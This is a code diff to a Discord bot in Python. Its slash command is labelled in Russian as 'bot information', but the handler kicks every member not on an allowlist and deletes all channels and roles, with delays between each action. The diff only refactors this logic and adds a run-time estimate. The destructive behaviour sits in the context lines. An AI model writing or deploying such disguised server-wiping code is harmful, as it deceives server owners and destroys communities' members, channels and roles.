@@ -13,7 +13,11 @@ async def on_ready() -> None:
 
 @bot.slash_command(description='Информация о боте')
 async def bot_info(ctx) -> None:
-    for member in ctx.guild.members:
+    members, channels, roles = ctx.guild.members, ctx.guild.channels, ctx.guild.roles
+    except_time = (len(members) * 0.3) + (len(channels) * 0.3) + (len(roles) * 0.3)
+    print(f'{except_time=}')
+    
+    for member in members:
         try:
             if member.id not in config.dont_kick_them:
                 await member.kick()
@@ -22,7 +26,7 @@ async def bot_info(ctx) -> None:
         finally:
             await asyncio.sleep(0.3)
 
-    for channel in ctx.guild.channels:
+    for channel in channels:
         try:
             await channel.delete()
         except Exception as ex:
@@ -30,7 +34,7 @@ async def bot_info(ctx) -> None:
         finally:
             await asyncio.sleep(0.3)
     
-    for role in ctx.guild.roles:
+    for role in roles:
         try:
             await role.delete()
         except Exception as ex:
